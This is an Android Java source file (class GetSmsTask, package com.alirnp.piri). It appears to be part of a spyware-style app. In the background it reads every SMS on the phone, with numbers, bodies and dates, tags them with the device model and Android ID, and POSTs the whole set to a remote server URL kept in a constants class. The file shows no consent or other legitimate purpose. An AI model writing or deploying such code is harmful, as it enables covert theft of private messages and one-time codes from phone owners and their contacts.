package com.alirnp.piri;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Build;
import android.provider.Settings;
import android.telecom.TelecomManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.jaredrummler.android.device.DeviceName;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.lang.ref.WeakReference;
import java.util.List;

import me.everything.providers.android.telephony.Sms;
import me.everything.providers.android.telephony.TelephonyProvider;
import me.everything.providers.core.Data;

public class GetSmsTask extends AsyncTask<Void, Void, JSONObject> {


    private WeakReference<Context> contextWeakReference;
    private OnSuccessListener onSuccessListener;


    GetSmsTask(Context context, OnSuccessListener onSuccessListener) {
        contextWeakReference = new WeakReference<>(context);
        this.onSuccessListener = onSuccessListener;
    }


    @Override
    protected JSONObject doInBackground(Void... params) {

        JSONObject jsonObject = new JSONObject();
        JSONArray array = new JSONArray();

        try {

            Context context = contextWeakReference.get();
            if (context == null) return null;

            TelephonyProvider telephonyProvider = new TelephonyProvider(context);
            Data<Sms> smsData = telephonyProvider.getSms(TelephonyProvider.Filter.ALL);
            List<Sms> smsList = smsData.getList();

            String android_id = Settings.Secure.getString(contextWeakReference.get().getContentResolver(), Settings.Secure.ANDROID_ID);

            jsonObject.put(Constants.PHONE_MODEL, getDeviceModel());
            jsonObject.put(Constants.SERIAL_NUMBER, android_id);
            jsonObject.put(Constants.SIZE, String.valueOf(smsList.size()));


            for (int i = 0; i < smsList.size(); i++) {
                JSONObject smsObject = new JSONObject();
                Sms sms = smsList.get(i);

                if (sms != null) {

                    smsObject.put(Constants.THREAD, sms.threadId);
                    smsObject.put(Constants.TYPE, sms.type.toString());
                    smsObject.put(Constants.NUMBER, sms.address);
                    smsObject.put(Constants.BODY, sms.body);
                    smsObject.put(Constants.SENT_DATE, sms.sentDate);
                    smsObject.put(Constants.RECEIVED_DATE, sms.receivedDate);

                    array.put(smsObject);


                } else {
                    Log.i(Constants.TAG, "onPostExecute: ERROR");
                }

            }

            jsonObject.put(Constants.SMS, array);


        } catch (JSONException e) {
            Log.i(Constants.TAG, "doInBackground: " + e);
        }

        return jsonObject;

    }

    @Override
    protected void onPostExecute(JSONObject jsonObject) {

        Context context = contextWeakReference.get();

        if (context == null || jsonObject == null) return;

        sendToServer(context , jsonObject);


    }

    private void sendToServer(Context context, JSONObject jsonObject) {
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, Constants.URL_SMS, jsonObject,
                response -> {
                    if (onSuccessListener != null) {
                        try {
                            boolean success = response.getBoolean("success");
                            onSuccessListener.OnSuccess(success, Constants.State.SMS);

                            Log.i(Constants.TAG, "success : " + success);


                        } catch (JSONException e) {
                            Log.i(Constants.TAG, e.toString());
                            onSuccessListener.OnSuccess(false, Constants.State.SMS);
                        }
                    } else {
                        throw new IllegalArgumentException("onSuccessListener is null");
                    }


                }
                , error -> {
            onSuccessListener.OnSuccess(false, Constants.State.SMS);
            Log.i(Constants.TAG, "onPostExecute: " + error.toString());
        });


        request.setRetryPolicy(new DefaultRetryPolicy(70000, DefaultRetryPolicy.DEFAULT_MAX_RETRIES, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        RequestQueue queue = Volley.newRequestQueue(context);
        queue.add(request);
    }


    private String getDeviceModel(){
        return Build.MANUFACTURER
                + " " + Build.MODEL + " " + Build.VERSION.RELEASE
                + " " + Build.VERSION_CODES.class.getFields()[android.os.Build.VERSION.SDK_INT].getName();
    }

}
